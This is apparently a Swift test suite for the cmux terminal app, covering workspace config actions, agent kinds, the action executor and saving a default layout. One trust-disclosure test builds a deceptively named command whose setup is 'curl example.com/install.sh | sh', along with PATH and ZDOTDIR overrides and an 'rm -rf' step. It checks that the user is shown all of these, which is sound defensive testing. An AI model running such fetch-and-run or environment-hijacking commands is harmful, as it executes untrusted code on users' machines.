import Foundation
import Testing

#if canImport(cmux_DEV)
@testable import cmux_DEV
#elseif canImport(cmux)
@testable import cmux
#endif

/// Inline `type: "workspace"` config actions: decoding, resolution defaults,
/// plus-button menu auto-append, trust disclosure, and executor behavior.
struct CmuxConfigWorkspaceActionTests {
    private func decode(_ json: String) throws -> CmuxConfigFile {
        try JSONDecoder().decode(CmuxConfigFile.self, from: Data(json.utf8))
    }

    private func workspaceAction(
        in config: CmuxConfigFile,
        id: String
    ) throws -> (definition: CmuxWorkspaceDefinition, restart: CmuxRestartBehavior?) {
        let action = try #require(config.actions[id]?.action)
        return try #require(action.inlineWorkspace)
    }

    private func temporaryRoot(_ label: String) throws -> URL {
        let root = FileManager.default.temporaryDirectory.appendingPathComponent(
            "cmux-workspace-action-\(label)-\(UUID().uuidString)",
            isDirectory: true
        )
        try FileManager.default.createDirectory(at: root, withIntermediateDirectories: true)
        return root
    }

    private func decodeJSONC(_ source: String) throws -> CmuxConfigFile {
        let sanitized = try JSONCParser.preprocess(data: Data(source.utf8))
        return try JSONDecoder().decode(CmuxConfigFile.self, from: sanitized)
    }

    // MARK: - Decoding workspace actions

    @Test func decodeWorkspaceActionWithExplicitType() throws {
        let config = try decode("""
        {
          "actions": {
            "dev-setup": {
              "type": "workspace",
              "title": "Dev Setup",
              "restart": "recreate",
              "newWorkspaceMenu": true,
              "workspace": {
                "name": "Dev",
                "cwd": "~/code/app",
                "setup": "  git fetch --all  ",
                "layout": {
                  "direction": "horizontal",
                  "split": 0.4,
                  "children": [
                    { "pane": { "surfaces": [ { "type": "terminal", "command": "claude", "focus": true } ] } },
                    { "pane": { "surfaces": [ { "type": "browser", "url": "https://example.com" } ] } }
                  ]
                }
              }
            }
          }
        }
        """)
        let inline = try workspaceAction(in: config, id: "dev-setup")
        #expect(inline.definition.name == "Dev")
        #expect(inline.definition.cwd == "~/code/app")
        #expect(inline.definition.setup == "git fetch --all")
        #expect(inline.restart == .recreate)
        #expect(config.actions["dev-setup"]?.newWorkspaceMenu == true)
        guard case .split(let split)? = inline.definition.layout else {
            Issue.record("Expected split layout")
            return
        }
        #expect(split.direction == .horizontal)
        #expect(split.children.count == 2)
    }

    @Test func decodeWorkspaceActionInferredFromWorkspaceKey() throws {
        let config = try decode("""
        {
          "actions": {
            "quick": {
              "title": "Quick",
              "workspace": { "name": "Quick" }
            }
          }
        }
        """)
        let inline = try workspaceAction(in: config, id: "quick")
        #expect(inline.definition.name == "Quick")
        #expect(inline.restart == nil)
    }

    @Test func workspaceActionRequiresWorkspaceObject() {
        #expect(throws: (any Error).self) {
            try decode("""
            {
              "actions": {
                "broken": { "type": "workspace", "title": "Broken" }
              }
            }
            """)
        }
    }

    @Test func workspaceActionEncodeDecodeRoundTrip() throws {
        let definition = CmuxWorkspaceDefinition(
            name: "Round Trip",
            cwd: "~/code",
            env: ["FOO": "bar"],
            setup: "make deps",
            layout: .split(CmuxSplitDefinition(
                direction: .vertical,
                split: 0.3,
                children: [
                    .pane(CmuxPaneDefinition(surfaces: [
                        CmuxSurfaceDefinition(type: .terminal, name: "Agent", command: "opencode", focus: true)
                    ])),
                    .pane(CmuxPaneDefinition(surfaces: [
                        CmuxSurfaceDefinition(type: .browser, url: "https://example.com")
                    ])),
                ]
            ))
        )
        let original = CmuxConfigActionDefinition(
            action: .workspace(definition, restart: .confirm),
            title: "Round Trip",
            newWorkspaceMenu: false
        )
        let data = try JSONEncoder().encode(original)
        let decoded = try JSONDecoder().decode(CmuxConfigActionDefinition.self, from: data)
        #expect(decoded == original)
    }

    @Test func decodeBlankSetupBecomesNil() throws {
        let config = try decode("""
        {
          "actions": {
            "blank-setup": { "workspace": { "name": "X", "setup": "   " } }
          }
        }
        """)
        let inline = try workspaceAction(in: config, id: "blank-setup")
        #expect(inline.definition.setup == nil)
    }

    // MARK: - Agent kinds

    @Test func decodeKnownAndCustomAgents() throws {
        let config = try decode("""
        {
          "actions": {
            "oc": { "type": "agent", "agent": "opencode" },
            "custom": { "type": "agent", "agent": "aider", "args": "--model gpt" }
          }
        }
        """)
        guard case .agent(let ocKind, _)? = config.actions["oc"]?.action else {
            Issue.record("Expected agent action")
            return
        }
        #expect(ocKind == .opencode)
        #expect(ocKind.commandName == "opencode")

        guard case .agent(let customKind, let args)? = config.actions["custom"]?.action else {
            Issue.record("Expected agent action")
            return
        }
        #expect(customKind == .custom("aider"))
        #expect(customKind.commandName == "aider")
        #expect(args == "--model gpt")
        #expect(config.actions["custom"]?.action?.terminalCommand == "aider --model gpt")
    }

    @Test func customAgentRejectsWhitespaceNames() {
        #expect(throws: (any Error).self) {
            try decode("""
            {
              "actions": {
                "bad": { "type": "agent", "agent": "aider --yolo" }
              }
            }
            """)
        }
    }

    @Test func agentEncodeRoundTrip() throws {
        for kind in [CmuxConfigAgentKind.codex, .claudeCode, .opencode, .custom("goose")] {
            let data = try JSONEncoder().encode(kind)
            let decoded = try JSONDecoder().decode(CmuxConfigAgentKind.self, from: data)
            #expect(decoded == kind)
        }
    }

    // MARK: - Resolved action defaults

    @Test func wantsNewWorkspaceMenuDefaults() throws {
        let workspaceAction = try #require(CmuxResolvedConfigAction.fromDefinition(
            id: "ws",
            definition: CmuxConfigActionDefinition(
                action: .workspace(CmuxWorkspaceDefinition(name: "W"), restart: nil)
            ),
            sourcePath: nil
        ))
        #expect(workspaceAction.wantsNewWorkspaceMenu)

        let commandAction = try #require(CmuxResolvedConfigAction.fromDefinition(
            id: "cmd",
            definition: CmuxConfigActionDefinition(action: .command("make")),
            sourcePath: nil
        ))
        #expect(!commandAction.wantsNewWorkspaceMenu)

        let optedOut = try #require(CmuxResolvedConfigAction.fromDefinition(
            id: "ws2",
            definition: CmuxConfigActionDefinition(
                action: .workspace(CmuxWorkspaceDefinition(name: "W2"), restart: nil),
                newWorkspaceMenu: false
            ),
            sourcePath: nil
        ))
        #expect(!optedOut.wantsNewWorkspaceMenu)

        let optedIn = try #require(CmuxResolvedConfigAction.fromDefinition(
            id: "cmd2",
            definition: CmuxConfigActionDefinition(
                action: .command("make"),
                newWorkspaceMenu: true
            ),
            sourcePath: nil
        ))
        #expect(optedIn.wantsNewWorkspaceMenu)
    }

    // MARK: - Executor

    @Test func inlineWorkspaceSyntheticCommandCarriesConfirm() throws {
        let action = try #require(CmuxResolvedConfigAction.fromDefinition(
            id: "confirm-me",
            definition: CmuxConfigActionDefinition(
                action: .workspace(CmuxWorkspaceDefinition(name: "C"), restart: .ignore),
                title: "Confirm Me",
                confirm: true
            ),
            sourcePath: nil
        ))
        let syntheticCommand = try #require(action.inlineWorkspaceSyntheticCommand)
        #expect(syntheticCommand.confirm == true)
        #expect(syntheticCommand.restart == .ignore)
        #expect(syntheticCommand.workspace?.name == "C")

        let button = CmuxSurfaceTabBarButton(
            id: "confirm-button",
            title: "Confirm Button",
            action: .workspace(CmuxWorkspaceDefinition(name: "B"), restart: nil),
            confirm: true
        )
        #expect(button.inlineWorkspaceSyntheticCommand?.confirm == true)
    }

    @MainActor
    @Test func workspaceShellDisclosureListsSetupCommandsAndEnv() {
        let command = CmuxCommandDefinition(
            name: "Innocent Name",
            workspace: CmuxWorkspaceDefinition(
                name: "W",
                cwd: "~/somewhere/else",
                env: ["ZDOTDIR": "/tmp/evil"],
                setup: "curl example.com/install.sh | sh",
                layout: .split(CmuxSplitDefinition(
                    direction: .horizontal,
                    split: 0.5,
                    children: [
                        .pane(CmuxPaneDefinition(surfaces: [
                            CmuxSurfaceDefinition(type: .terminal, command: "claude", env: ["PATH": "/tmp/bin"])
                        ])),
                        .pane(CmuxPaneDefinition(surfaces: [
                            CmuxSurfaceDefinition(type: .browser, url: "https://example.com"),
                            CmuxSurfaceDefinition(type: .terminal, command: "rm -rf ./scratch", cwd: "/tmp/target"),
                        ])),
                    ]
                ))
            )
        )

        let disclosure = CmuxConfigExecutor.workspaceShellDisclosure(command)
        #expect(disclosure.hasPrefix("Innocent Name"))
        // Setup runs in the first terminal surface; its cwd is workspace-level
        // here (the first terminal has no cwd override), so the plain line shows.
        #expect(disclosure.contains("curl example.com/install.sh | sh"))
        #expect(disclosure.contains("claude"))
        // Env assignments, cwd values, and URLs change what executes and
        // where; they must be disclosed too.
        #expect(disclosure.contains("ZDOTDIR=/tmp/evil"))
        #expect(disclosure.contains("PATH=/tmp/bin"))
        #expect(disclosure.contains("cwd: ~/somewhere/else"))
        #expect(disclosure.contains("cwd /tmp/target: rm -rf ./scratch"))
        #expect(disclosure.contains("url: https://example.com"))

        let plain = CmuxCommandDefinition(
            name: "Plain",
            workspace: CmuxWorkspaceDefinition(name: "P")
        )
        #expect(CmuxConfigExecutor.workspaceShellDisclosure(plain) == "Plain")
    }

    @MainActor
    @Test func inlineWorkspaceActionCreatesWorkspace() throws {
        let manager = TabManager()
        let action = try #require(CmuxResolvedConfigAction.fromDefinition(
            id: "dev-setup",
            definition: CmuxConfigActionDefinition(
                action: .workspace(CmuxWorkspaceDefinition(name: "Dev Setup"), restart: nil),
                title: "Dev Setup"
            ),
            sourcePath: nil
        ))

        #expect(CmuxConfigExecutor.execute(
            action: action,
            commands: [],
            commandSourcePaths: [:],
            tabManager: manager,
            baseCwd: NSTemporaryDirectory(),
            globalConfigPath: "/tmp/cmux-test-global-config.json"
        ))

        #expect(manager.tabs.count == 2)
        #expect(manager.selectedWorkspace?.customTitle == "Dev Setup")
    }

    @MainActor
    @Test func inlineWorkspaceSurfaceTabBarButtonExecutesOnClick() throws {
        let manager = TabManager()
        let workspace = try #require(manager.tabs.first)
        let button = CmuxSurfaceTabBarButton(
            id: "review-setup",
            title: "Review Setup",
            action: .workspace(CmuxWorkspaceDefinition(name: "Review"), restart: nil)
        )
        workspace.applySurfaceTabBarButtons(
            [button],
            sourcePath: nil,
            globalConfigPath: "/tmp/cmux-test-global-config.json",
            terminalCommandSourcePaths: [:],
            workspaceCommands: [:]
        )

        let pane = try #require(workspace.bonsplitController.allPaneIds.first)
        workspace.splitTabBar(
            workspace.bonsplitController,
            didRequestCustomAction: "review-setup",
            inPane: pane
        )

        #expect(manager.tabs.count == 2, "inline workspace button click should create the workspace")
        #expect(manager.selectedWorkspace?.customTitle == "Review")
    }

    @MainActor
    @Test func inlineWorkspaceActionHonorsIgnoreRestart() throws {
        let manager = TabManager()
        let existingWorkspace = manager.tabs[0]
        existingWorkspace.setCustomTitle("Dev Setup")

        let action = try #require(CmuxResolvedConfigAction.fromDefinition(
            id: "dev-setup",
            definition: CmuxConfigActionDefinition(
                action: .workspace(CmuxWorkspaceDefinition(name: "Dev Setup"), restart: .ignore),
                title: "Dev Setup"
            ),
            sourcePath: nil
        ))

        #expect(CmuxConfigExecutor.execute(
            action: action,
            commands: [],
            commandSourcePaths: [:],
            tabManager: manager,
            baseCwd: NSTemporaryDirectory(),
            globalConfigPath: "/tmp/cmux-test-global-config.json"
        ))

        #expect(manager.tabs.map(\.id) == [existingWorkspace.id])
        #expect(manager.selectedWorkspace?.id == existingWorkspace.id)
    }

    // MARK: - Default workspace layout persistence

    @MainActor
    @Test func setNewWorkspaceDefaultActionPreservesCommentsAndResolves() throws {
        let root = try temporaryRoot("default-comments")
        defer { try? FileManager.default.removeItem(at: root) }
        let configPath = root.appendingPathComponent("cmux.json").path
        let existing = """
        {
          // saved layouts
          "actions": {
            "review-setup": {
              "type": "workspace",
              "title": "Review Setup",
              "workspace": { "name": "Review" }
            } // keep action note
          }
        }
        """
        try existing.write(toFile: configPath, atomically: true, encoding: .utf8)

        try CmuxConfigActionSaver.setNewWorkspaceDefaultAction(
            id: "review-setup",
            globalConfigPath: configPath
        )

        let saved = try String(contentsOfFile: configPath, encoding: .utf8)
        #expect(saved.contains("// saved layouts"))
        #expect(saved.contains("// keep action note"))
        let config = try decodeJSONC(saved)
        #expect(config.ui?.newWorkspace?.action == "review-setup")

        let store = CmuxConfigStore(globalConfigPath: configPath)
        store.loadAll()
        #expect(store.newWorkspaceActionID == "review-setup")
        #expect(store.resolvedNewWorkspaceAction()?.id == "review-setup")
    }

    @Test func setNewWorkspaceDefaultActionReplacesExistingValue() throws {
        let root = try temporaryRoot("default-replace")
        defer { try? FileManager.default.removeItem(at: root) }
        let configPath = root.appendingPathComponent("cmux.json").path
        try """
        {
          "ui": {
            "newWorkspace": {
              "action": "first"
            }
          }
        }
        """.write(toFile: configPath, atomically: true, encoding: .utf8)

        try CmuxConfigActionSaver.setNewWorkspaceDefaultAction(id: "second", globalConfigPath: configPath)
        try CmuxConfigActionSaver.setNewWorkspaceDefaultAction(id: "second", globalConfigPath: configPath)

        let saved = try String(contentsOfFile: configPath, encoding: .utf8)
        #expect(!saved.contains("\"action\": \"first\""))
        #expect(saved.components(separatedBy: "\"action\": \"second\"").count - 1 == 1)
        let config = try decodeJSONC(saved)
        #expect(config.ui?.newWorkspace?.action == "second")
    }

    @Test func setNewWorkspaceDefaultActionCreatesMissingNewWorkspaceObject() throws {
        let root = try temporaryRoot("default-create-new-workspace")
        defer { try? FileManager.default.removeItem(at: root) }
        let configPath = root.appendingPathComponent("cmux.json").path
        try """
        {
          "ui": {
            "surfaceTabBar": {
              "buttons": ["cmux.newTerminal"]
            }
          },
          "commands": []
        }
        """.write(toFile: configPath, atomically: true, encoding: .utf8)

        try CmuxConfigActionSaver.setNewWorkspaceDefaultAction(id: "layout", globalConfigPath: configPath)

        let saved = try String(contentsOfFile: configPath, encoding: .utf8)
        #expect(saved.components(separatedBy: "\"ui\"").count - 1 == 1)
        #expect(saved.contains("\"surfaceTabBar\""))
        let config = try decodeJSONC(saved)
        #expect(config.ui?.newWorkspace?.action == "layout")
    }

    @Test func unsetNewWorkspaceDefaultActionRemovesKeyAndIsIdempotent() throws {
        let root = try temporaryRoot("default-remove")
        defer { try? FileManager.default.removeItem(at: root) }
        let configPath = root.appendingPathComponent("cmux.json").path
        try """
        {
          // ui note
          "ui": {
            "newWorkspace": {
              "contextMenu": ["cmux.newTerminal"], // keep menu
              "action": "layout"
            }
          }
        }
        """.write(toFile: configPath, atomically: true, encoding: .utf8)

        try CmuxConfigActionSaver.setNewWorkspaceDefaultAction(id: nil, globalConfigPath: configPath)
        let saved = try String(contentsOfFile: configPath, encoding: .utf8)
        #expect(saved.contains("// ui note"))
        #expect(saved.contains("// keep menu"))
        #expect(!saved.contains("\"action\": \"layout\""))
        let config = try decodeJSONC(saved)
        #expect(config.ui?.newWorkspace?.action == nil)

        try CmuxConfigActionSaver.setNewWorkspaceDefaultAction(id: nil, globalConfigPath: configPath)
        #expect(try String(contentsOfFile: configPath, encoding: .utf8) == saved)
    }

    @Test func setNewWorkspaceDefaultActionFailsClosedForMalformedConfig() throws {
        let root = try temporaryRoot("default-fail-closed")
        defer { try? FileManager.default.removeItem(at: root) }
        let brokenPath = root.appendingPathComponent("broken.json").path
        let broken = "{ \"ui\": tru }\n"
        try broken.write(toFile: brokenPath, atomically: true, encoding: .utf8)

        #expect(throws: (any Error).self) {
            try CmuxConfigActionSaver.setNewWorkspaceDefaultAction(id: "layout", globalConfigPath: brokenPath)
        }
        #expect(try String(contentsOfFile: brokenPath, encoding: .utf8) == broken)

        let nonObjectPath = root.appendingPathComponent("non-object.json").path
        let nonObject = "{\n  \"ui\": \"not an object\"\n}\n"
        try nonObject.write(toFile: nonObjectPath, atomically: true, encoding: .utf8)

        #expect(throws: (any Error).self) {
            try CmuxConfigActionSaver.setNewWorkspaceDefaultAction(id: "layout", globalConfigPath: nonObjectPath)
        }
        #expect(try String(contentsOfFile: nonObjectPath, encoding: .utf8) == nonObject)
    }

    @Test func saveWorkspaceActionThenSetAsDefaultResolvesNewID() throws {
        let root = try temporaryRoot("save-then-default")
        defer { try? FileManager.default.removeItem(at: root) }
        let configPath = root.appendingPathComponent("cmux.json").path

        let result = try CmuxConfigActionSaver.saveWorkspaceAction(
            title: "Review Setup",
            definition: CmuxWorkspaceDefinition(name: "Review"),
            globalConfigPath: configPath
        )
        try CmuxConfigActionSaver.setNewWorkspaceDefaultAction(
            id: result.actionID,
            globalConfigPath: configPath
        )

        let saved = try String(contentsOfFile: configPath, encoding: .utf8)
        let config = try decodeJSONC(saved)
        #expect(config.ui?.newWorkspace?.action == result.actionID)
    }

    @Test func newWorkspaceDefaultLayoutMenuModelBuildsSortedState() throws {
        let zebra = try #require(CmuxResolvedConfigAction.fromDefinition(
            id: "zebra",
            definition: CmuxConfigActionDefinition(
                action: .workspace(CmuxWorkspaceDefinition(name: "Zebra"), restart: nil),
                title: "Zebra"
            ),
            sourcePath: nil
        ))
        let alphaTwo = try #require(CmuxResolvedConfigAction.fromDefinition(
            id: "alpha-2",
            definition: CmuxConfigActionDefinition(
                action: .workspace(CmuxWorkspaceDefinition(name: "Alpha"), restart: nil),
                title: "Alpha"
            ),
            sourcePath: nil
        ))
        let alphaOne = try #require(CmuxResolvedConfigAction.fromDefinition(
            id: "alpha-1",
            definition: CmuxConfigActionDefinition(
                action: .workspace(CmuxWorkspaceDefinition(name: "Alpha"), restart: nil),
                title: "Alpha"
            ),
            sourcePath: nil
        ))

        let none = NewWorkspaceDefaultLayoutMenuModel.build(
            loadedActions: [zebra, alphaTwo, alphaOne],
            newWorkspaceActionID: nil
        )
        #expect(none.entries.map(\.id) == ["alpha-1", "alpha-2", "zebra"])
        #expect(none.entries.allSatisfy { !$0.isCurrent })
        #expect(!none.hasDefault)

        let current = NewWorkspaceDefaultLayoutMenuModel.build(
            loadedActions: [zebra, alphaTwo, alphaOne],
            newWorkspaceActionID: "alpha-2"
        )
        #expect(current.hasDefault)
        #expect(current.entries.map(\.id) == ["alpha-1", "alpha-2", "zebra"])
        #expect(current.entries.map(\.isCurrent) == [false, true, false])

        let dangling = NewWorkspaceDefaultLayoutMenuModel.build(
            loadedActions: [zebra, alphaTwo, alphaOne],
            newWorkspaceActionID: "missing"
        )
        #expect(dangling.hasDefault)
        #expect(dangling.entries.allSatisfy { !$0.isCurrent })
    }
}
